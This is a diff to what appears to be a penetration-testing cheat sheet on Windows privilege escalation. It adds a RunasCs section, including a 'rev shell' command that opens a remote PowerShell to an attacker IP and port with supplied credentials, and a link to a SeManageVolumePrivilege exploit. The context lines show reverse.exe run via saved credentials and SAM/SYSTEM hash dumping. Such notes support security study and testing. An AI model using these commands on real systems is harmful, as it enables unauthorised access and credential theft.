@@ -81,6 +81,19 @@ cmdkey /list
 runas /savecred /user:admin reverse.exe
 ```
 
+### RunasCs
+
+Useful for executing commands as another user with explicit credentials when you can't access in any other way.
+
+> <https://github.com/antonioCoco/RunasCs>
+
+```shell
+Import-Module .\
+Invoke-RunasCs <user> <pass> <cmd>
+# rev shell
+Invoke-RunasCs <user> <pass> powershell.exe -Remote <ip>:<port>
+```
+
 ### SAM and SYSTEM
 
 !!! info
@@ -344,6 +357,10 @@ pypykatz registry --sam sam system
 # or secretsdump
 impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
 ```
+
+### SeManageVolumePrivilege
+
+> <https://github.com/CsEnox/SeManageVolumeExploit>
 
 ## Pass the Hash
 
